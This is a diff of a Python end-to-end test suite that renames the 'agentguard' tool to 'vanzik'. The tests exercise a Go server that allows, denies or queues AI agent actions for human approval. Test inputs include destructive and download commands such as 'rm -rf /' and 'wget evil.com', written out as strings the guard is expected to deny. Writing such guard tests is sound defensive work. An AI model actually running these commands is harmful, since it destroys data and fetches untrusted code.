@@ -1,4 +1,4 @@
-"""End-to-end tests that spin up the REAL Go `agentguard` binary and drive it
+"""End-to-end tests that spin up the REAL Go `vanzik` binary and drive it
 with the real Python SDK. This is the strongest possible integration test —
 it verifies the entire HTTP protocol (auth, CORS, CSRF, cost reservations,
 approval queue) across language boundaries.
@@ -6,9 +6,9 @@ approval queue) across language boundaries.
 The tests are skipped if the binary isn't found (e.g., on fresh checkouts
 where `go build` hasn't been run). Build with:
 
-    cd <repo-root> && go build -o agentguard.exe ./cmd/agentguard
+    cd <repo-root> && go build -o vanzik.exe ./cmd/vanzik
 
-On POSIX, use `agentguard` without the .exe suffix.
+On POSIX, use `vanzik` without the .exe suffix.
 """
 
 import json
@@ -23,7 +23,7 @@ from typing import Optional
 
 import pytest
 
-from agentguard import (
+from vanzik import (
     DECISION_ALLOW,
     DECISION_DENY,
     DECISION_REQUIRE_APPROVAL,
@@ -36,12 +36,12 @@ from agentguard import (
 # ---------------------------------------------------------------------------
 
 def _find_binary() -> Optional[str]:
-    """Locate the compiled agentguard binary relative to this test file."""
+    """Locate the compiled vanzik binary relative to this test file."""
     # tests/test_X.py -> plugins/python -> repo root
     repo_root = Path(__file__).resolve().parents[3]
     candidates = [
-        repo_root / "agentguard.exe",
-        repo_root / "agentguard",
+        repo_root / "vanzik.exe",
+        repo_root / "vanzik",
     ]
     for c in candidates:
         if c.is_file():
@@ -52,7 +52,7 @@ def _find_binary() -> Optional[str]:
 BINARY = _find_binary()
 skip_no_binary = pytest.mark.skipif(
     BINARY is None,
-    reason="agentguard binary not built — run `go build -o agentguard.exe ./cmd/agentguard` in repo root",
+    reason="vanzik binary not built — run `go build -o vanzik.exe ./cmd/vanzik` in repo root",
 )
 
 
@@ -146,8 +146,8 @@ class ServerHandle:
 
 
 @pytest.fixture()
-def agentguard_server(tmp_path):
-    """Start the real agentguard binary on a free port with an API key set."""
+def vanzik_server(tmp_path):
+    """Start the real vanzik binary on a free port with an API key set."""
     if BINARY is None:
         pytest.skip("binary not built")
 
@@ -204,37 +204,37 @@ def agentguard_server(tmp_path):
 
 @skip_no_binary
 class TestRealServerBasics:
-    def test_health_is_open(self, agentguard_server):
+    def test_health_is_open(self, vanzik_server):
         import urllib.request
 
-        with urllib.request.urlopen(f"{agentguard_server.base_url}/health") as r:
+        with urllib.request.urlopen(f"{vanzik_server.base_url}/health") as r:
             body = json.loads(r.read())
         assert body["status"] == "ok"
 
-    def test_check_allow(self, agentguard_server):
-        g = Guard(agentguard_server.base_url, agent_id="e2e")
+    def test_check_allow(self, vanzik_server):
+        g = Guard(vanzik_server.base_url, agent_id="e2e")
         r = g.check("shell", command="ls -la")
         assert r.allowed, f"expected ALLOW, got {r.decision}: {r.reason}"
 
-    def test_check_deny(self, agentguard_server):
-        g = Guard(agentguard_server.base_url, agent_id="e2e")
+    def test_check_deny(self, vanzik_server):
+        g = Guard(vanzik_server.base_url, agent_id="e2e")
         r = g.check("shell", command="rm -rf /")
         assert r.denied
         assert "destructive" in r.reason or "rm" in r.reason.lower()
 
-    def test_check_default_deny(self, agentguard_server):
-        g = Guard(agentguard_server.base_url, agent_id="e2e")
+    def test_check_default_deny(self, vanzik_server):
+        g = Guard(vanzik_server.base_url, agent_id="e2e")
         r = g.check("shell", command="wget evil.com")
         assert r.denied  # no matching allow
 
 
 @skip_no_binary
 class TestRealServerCostTracking:
-    def test_session_cost_accumulates_and_denies(self, agentguard_server):
+    def test_session_cost_accumulates_and_denies(self, vanzik_server):
         """Real cost reservation across 3 calls — the server does atomic
         check-and-reserve, so the SDK just makes three calls and observes the
         third denial."""
-        g = Guard(agentguard_server.base_url, agent_id="cost-bot")
+        g = Guard(vanzik_server.base_url, agent_id="cost-bot")
         sid = "e2e-cost-session"
 
         r1 = g.check("cost", session_id=sid, est_cost=4.0)
@@ -247,8 +247,8 @@ class TestRealServerCostTracking:
         assert r3.denied, f"3rd: {r3.decision} {r3.reason}"
         assert r3.matched_rule == "deny:cost:max_per_session"
 
-    def test_session_cost_isolation(self, agentguard_server):
-        g = Guard(agentguard_server.base_url, agent_id="cost-bot")
+    def test_session_cost_isolation(self, vanzik_server):
+        g = Guard(vanzik_server.base_url, agent_id="cost-bot")
         r_a = g.check("cost", session_id="sess-a", est_cost=4.0)
         r_b = g.check("cost", session_id="sess-b", est_cost=4.0)
         assert r_a.allowed and r_b.allowed
@@ -257,20 +257,20 @@ class TestRealServerCostTracking:
 
 @skip_no_binary
 class TestRealServerApprovalFlow:
-    def test_require_approval_returns_id_and_url(self, agentguard_server):
-        g = Guard(agentguard_server.base_url, agent_id="approval-bot")
+    def test_require_approval_returns_id_and_url(self, vanzik_server):
+        g = Guard(vanzik_server.base_url, agent_id="approval-bot")
         r = g.check("shell", command="sudo reboot")
         assert r.needs_approval
         assert r.approval_id.startswith("ap_")
         assert r.approval_url.startswith("http://")
 
-    def test_bearer_approve_then_status_resolves(self, agentguard_server):
+    def test_bearer_approve_then_status_resolves(self, vanzik_server):
         """Full round-trip: queue an approval, approve it via Bearer auth,
         poll /v1/status with Bearer and see it resolved."""
         g = Guard(
-            agentguard_server.base_url,
+            vanzik_server.base_url,
             agent_id="approval-bot",
-            api_key=agentguard_server.api_key,
+            api_key=vanzik_server.api_key,
         )
         r = g.check("shell", command="sudo halt")
         assert r.needs_approval
@@ -279,11 +279,11 @@ class TestRealServerApprovalFlow:
         resolved = g.wait_for_approval(r.approval_id, timeout=3, poll_interval=1)
         assert resolved.allowed
 
-    def test_deny_round_trip(self, agentguard_server):
+    def test_deny_round_trip(self, vanzik_server):
         g = Guard(
-            agentguard_server.base_url,
+            vanzik_server.base_url,
             agent_id="approval-bot",
-            api_key=agentguard_server.api_key,
+            api_key=vanzik_server.api_key,
         )
         r = g.check("shell", command="sudo shutdown")
         assert r.needs_approval
@@ -292,25 +292,25 @@ class TestRealServerApprovalFlow:
         resolved = g.wait_for_approval(r.approval_id, timeout=3, poll_interval=1)
         assert resolved.denied
 
-    def test_approve_without_auth_rejected(self, agentguard_server):
+    def test_approve_without_auth_rejected(self, vanzik_server):
         """No api_key on Guard → approve() should fail (server requires auth)."""
         g_writer = Guard(
-            agentguard_server.base_url,
-            api_key=agentguard_server.api_key,
+            vanzik_server.base_url,
+            api_key=vanzik_server.api_key,
         )
         r = g_writer.check("shell", command="sudo foo")
 
-        g_no_key = Guard(agentguard_server.base_url)  # no api_key
+        g_no_key = Guard(vanzik_server.base_url)  # no api_key
         # urllib raises on 401; Guard.approve returns False.
         assert g_no_key.approve(r.approval_id) is False
 
 
 @skip_no_binary
 class TestRealServerAgentOverride:
-    def test_research_agent_override(self, agentguard_server):
+    def test_research_agent_override(self, vanzik_server):
         """researcher agent gets scholar.google.com; default agent does not."""
-        default_guard = Guard(agentguard_server.base_url, agent_id="")
-        research_guard = Guard(agentguard_server.base_url, agent_id="researcher")
+        default_guard = Guard(vanzik_server.base_url, agent_id="")
+        research_guard = Guard(vanzik_server.base_url, agent_id="researcher")
 
         # Default agent: openai allowed, scholar denied.
         assert default_guard.check("network", domain="api.openai.com").allowed
@@ -323,18 +323,18 @@ class TestRealServerAgentOverride:
 
 @skip_no_binary
 class TestRealServerAudit:
-    def test_audit_entries_exist(self, agentguard_server):
+    def test_audit_entries_exist(self, vanzik_server):
         """After generating some checks, query /v1/audit with Bearer auth."""
         import urllib.request
 
-        g = Guard(agentguard_server.base_url, agent_id="audit-bot")
+        g = Guard(vanzik_server.base_url, agent_id="audit-bot")
         for _ in range(3):
             g.check("shell", command="ls -la")
 
         # Query audit via raw HTTP — the SDK doesn't expose audit query.
         req = urllib.request.Request(
-            f"{agentguard_server.base_url}/v1/audit?agent_id=audit-bot",
-            headers={"Authorization": f"Bearer {agentguard_server.api_key}"},
+            f"{vanzik_server.base_url}/v1/audit?agent_id=audit-bot",
+            headers={"Authorization": f"Bearer {vanzik_server.api_key}"},
         )
         with urllib.request.urlopen(req) as r:
             entries = json.loads(r.read())
@@ -342,35 +342,35 @@ class TestRealServerAudit:
         assert len(entries) >= 3
         assert all(e["agent_id"] == "audit-bot" for e in entries)
 
-    def test_audit_unauthorized(self, agentguard_server):
+    def test_audit_unauthorized(self, vanzik_server):
         """Audit without Bearer should 401."""
         import urllib.request
         import urllib.error
 
         with pytest.raises(urllib.error.HTTPError) as ei:
-            urllib.request.urlopen(f"{agentguard_server.base_url}/v1/audit")
+            urllib.request.urlopen(f"{vanzik_server.base_url}/v1/audit")
         assert ei.value.code == 401
 
 
 @skip_no_binary
 class TestRealServerDashboardAuth:
-    def test_dashboard_unauthenticated_serves_login_page(self, agentguard_server):
+    def test_dashboard_unauthenticated_serves_login_page(self, vanzik_server):
         import urllib.request
 
-        with urllib.request.urlopen(f"{agentguard_server.base_url}/dashboard") as r:
+        with urllib.request.urlopen(f"{vanzik_server.base_url}/dashboard") as r:
             body = r.read().decode()
         assert "Sign in" in body
-        assert agentguard_server.api_key not in body, "login page leaks API key"
+        assert vanzik_server.api_key not in body, "login page leaks API key"
 
-    def test_login_flow_sets_cookies(self, agentguard_server):
-        """POST /auth/login with the right key must set ag_session and ag_csrf
+    def test_login_flow_sets_cookies(self, vanzik_server):
+        """POST /auth/login with the right key must set vanzik_session and vanzik_csrf
         cookies and return a csrf_token in the JSON body."""
         import urllib.request
 
         req = urllib.request.Request(
-            f"{agentguard_server.base_url}/auth/login",
+            f"{vanzik_server.base_url}/auth/login",
             method="POST",
-            data=json.dumps({"api_key": agentguard_server.api_key}).encode(),
+            data=json.dumps({"api_key": vanzik_server.api_key}).encode(),
             headers={"Content-Type": "application/json"},
         )
         with urllib.request.urlopen(req) as r:
@@ -378,19 +378,19 @@ class TestRealServerDashboardAuth:
             cookies = r.headers.get_all("Set-Cookie") or []
 
         assert "csrf_token" in body and len(body["csrf_token"]) == 64
-        assert any("ag_session=" in c for c in cookies)
-        assert any("ag_csrf=" in c for c in cookies)
+        assert any("vanzik_session=" in c for c in cookies)
+        assert any("vanzik_csrf=" in c for c in cookies)
 
 
 @skip_no_binary
 class TestRealServerConcurrentSDKCalls:
-    def test_many_simultaneous_check_calls(self, agentguard_server):
+    def test_many_simultaneous_check_calls(self, vanzik_server):
         """Spawn many threads, each calling Guard.check. All should succeed
         and no data race or deadlock should surface (the Go server runs under
         its own scheduler, this just confirms the SDK + HTTP path is clean)."""
         import concurrent.futures
 
-        g = Guard(agentguard_server.base_url, agent_id="stress-bot")
+        g = Guard(vanzik_server.base_url, agent_id="stress-bot")
 
         def one(i):
             r = g.check("shell", command=f"ls -la worker-{i}")
